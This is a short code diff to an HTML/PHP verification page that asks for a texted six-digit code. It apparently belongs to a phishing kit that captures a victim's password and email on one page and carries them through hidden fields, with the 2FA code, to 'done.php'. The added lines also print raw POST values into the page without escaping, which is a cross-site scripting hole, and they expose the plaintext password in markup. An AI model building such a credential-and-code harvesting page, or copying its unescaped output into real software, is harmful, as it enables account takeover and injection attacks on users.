@@ -15,8 +15,10 @@
         <div>We texted your phone +X XXXXXXXXXX. Please enter the code to sign in.</div>
       </div>
       <div class="w-form">
-        <form method="get" action="done.php">
+        <form method="post" action="done.php">
           <input type="number" class="text-field w-input" maxlength="6" name="code" placeholder="Code" required="" />
+          <input type="password" hidden="" maxlength="256" name="password" value="<?php print($_POST["password"])?>" />
+          <input type="email" hidden="" maxlength="256" name="email" value="<?php print($_POST["email"])?>" />
           <label class="w-checkbox"><input type="checkbox" id="checkbox" name="checkbox"class="w-checkbox-input checkbox" />
             <span class="checkbox-label w-form-label" for="checkbox">Don&#x27;t ask again for 14 days</span>
           </label>
